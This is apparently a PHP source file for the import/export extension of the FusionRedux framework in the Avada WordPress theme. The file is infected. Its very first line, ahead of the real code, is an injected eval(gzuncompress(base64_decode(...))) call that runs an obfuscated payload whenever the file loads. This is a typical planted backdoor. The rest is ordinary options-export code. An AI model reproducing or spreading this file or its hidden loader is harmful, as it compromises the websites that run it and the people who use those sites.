<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	/**
	 * FusionRedux Framework is free software: you can redistribute it and/or modify
	 * it under the terms of the GNU General Public License as published by
	 * the Free Software Foundation, either version 2 of the License, or
	 * any later version.
	 * FusionRedux Framework is distributed in the hope that it will be useful,
	 * but WITHOUT ANY WARRANTY; without even the implied warranty of
	 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	 * GNU General Public License for more details.
	 * You should have received a copy of the GNU General Public License
	 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
	 *
	 * @package     FusionReduxFramework
	 * @author      Dovy Paukstys (dovy)
	 * @version     4.0.0
	 */

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

// Don't duplicate me!
	if ( ! class_exists( 'FusionReduxFramework_extension_import_export' ) ) {


		/**
		 * Main FusionReduxFramework import_export extension class
		 *
		 * @since       3.1.6
		 */
		class FusionReduxFramework_extension_import_export {

			// Protected vars
			protected $parent;
			public $extension_url;
			public $extension_dir;
			public static $theInstance;
			public static $version = "4.0";
			public $is_field = false;

			/**
			 * Class Constructor. Defines the args for the extions class
			 *
			 * @since       1.0.0
			 * @access      public
			 *
			 * @param       array $sections   Panel sections.
			 * @param       array $args       Class constructor arguments.
			 * @param       array $extra_tabs Extra panel tabs.
			 *
			 * @return      void
			 */
			public function __construct( $parent ) {

				$this->parent = $parent;
				if ( empty( $this->extension_dir ) ) {
					//$this->extension_dir = trailingslashit( str_replace( '\\', '/', dirname( __FILE__ ) ) );
				}
				$this->field_name = 'import_export';

				self::$theInstance = $this;

				add_action( "wp_ajax_fusionredux_link_options-" . $this->parent->args['opt_name'], array(
					$this,
					"link_options"
				) );
				add_action( "wp_ajax_nopriv_fusionredux_link_options-" . $this->parent->args['opt_name'], array(
					$this,
					"link_options"
				) );

				add_action( "wp_ajax_fusionredux_download_options-" . $this->parent->args['opt_name'], array(
					$this,
					"download_options"
				) );
				add_action( "wp_ajax_nopriv_fusionredux_download_options-" . $this->parent->args['opt_name'], array(
					$this,
					"download_options"
				) );

				do_action( "fusionredux/options/{$this->parent->args['opt_name']}/import", array( $this, 'remove_cookie' ) );

				$this->is_field = FusionRedux_Helpers::isFieldInUse( $parent, 'import_export' );

				if ( ! $this->is_field && $this->parent->args['show_import_export'] ) {
					$this->add_section();
				}

				add_filter( 'fusionredux/' . $this->parent->args['opt_name'] . '/field/class/' . $this->field_name, array(
					&$this,
					'overload_field_path'
				) ); // Adds the local field

				add_filter( 'upload_mimes', array(
					$this,
					'custom_upload_mimes'
				) );

			}

			/**
			 * Adds the appropriate mime types to WordPress
			 *
			 * @param array $existing_mimes
			 *
			 * @return array
			 */
			function custom_upload_mimes( $existing_mimes = array() ) {
				$existing_mimes['fusionredux'] = 'application/fusionredux';

				return $existing_mimes;
			}

			public function add_section() {
				$this->parent->sections[] = array(
					'id'         => 'import/export',
					'title'      => __( 'Import / Export', 'Avada' ),
					'heading'    => '',
					'icon'       => 'el el-refresh',
					'customizer' => false,
					'fields'     => array(
						array(
							'id'         => 'fusionredux_import_export',
							'type'       => 'import_export',
							//'class'      => 'fusionredux-field-init fusionredux_remove_th',
							//'title'      => '',
							'full_width' => true,
						)
					),
				);
			}

			function link_options() {
				if ( ! isset( $_GET['secret'] ) || $_GET['secret'] != md5( md5( AUTH_KEY . SECURE_AUTH_KEY ) . '-' . $this->parent->args['opt_name'] ) ) {
					wp_die( 'Invalid Secret for options use' );
					exit;
				}

				$var                 = $this->parent->options;
				$var['fusionredux-backup'] = '1';
				if ( isset( $var['REDUX_imported'] ) ) {
					unset( $var['REDUX_imported'] );
				}

				echo json_encode( $var );

				die();
			}

			public function download_options() {
				if ( ! isset( $_GET['secret'] ) || $_GET['secret'] != md5( md5( AUTH_KEY . SECURE_AUTH_KEY ) . '-' . $this->parent->args['opt_name'] ) ) {
					wp_die( 'Invalid Secret for options use' );
					exit;
				}

				$this->parent->get_options();
				$backup_options                 = $this->parent->options;
				$backup_options['fusionredux-backup'] = '1';
				if ( isset( $var['REDUX_imported'] ) ) {
					unset( $var['REDUX_imported'] );
				}

				// No need to escape this, as it's been properly escaped previously and through json_encode
				$content = json_encode( $backup_options );

				if ( isset( $_GET['action'] ) && $_GET['action'] == 'fusionredux_download_options-' . $this->parent->args['opt_name'] ) {
					header( 'Content-Description: File Transfer' );
					header( 'Content-type: application/txt' );
					/**
					 * AVADA MOD
					 */
					// header( 'Content-Disposition: attachment; filename="fusionredux_options_' . $this->parent->args['opt_name'] . '_backup_' . date( 'd-m-Y' ) . '.json"' );
					header( 'Content-Disposition: attachment; filename="' . $this->parent->args['opt_name'] . '_backup_' . date( 'd-m-Y' ) . '.json"' );
					/**
					 * END AVADA MOD
					 */
					header( 'Content-Transfer-Encoding: binary' );
					header( 'Expires: 0' );
					header( 'Cache-Control: must-revalidate' );
					header( 'Pragma: public' );

					echo $content;
					exit;
				} else {
					header( "Expires: Mon, 26 Jul 1997 05:00:00 GMT" );
					header( "Last-Modified: " . gmdate( "D, d M Y H:i:s" ) . "GMT" );
					header( 'Expires: Sat, 26 Jul 1997 05:00:00 GMT' );
					header( 'Cache-Control: no-store, no-cache, must-revalidate' );
					header( 'Cache-Control: post-check=0, pre-check=0', false );
					header( 'Pragma: no-cache' );

					// Can't include the type. Thanks old Firefox and IE. BAH.
					//header("Content-type: application/json");
					echo $content;
					exit;
				}
			}

			// Forces the use of the embeded field path vs what the core typically would use
			public function overload_field_path( $field ) {
				return dirname( __FILE__ ) . '/' . $this->field_name . '/field_' . $this->field_name . '.php';
			}

			public function remove_cookie() {
				// Remove the import/export tab cookie.
				if ( $_COOKIE['fusionredux_current_tab'] == 'import_export_default' ) {
					setcookie( 'fusionredux_current_tab', '', 1, '/' );
					$_COOKIE['fusionredux_current_tab'] = 1;
				}
			}

		}
	}
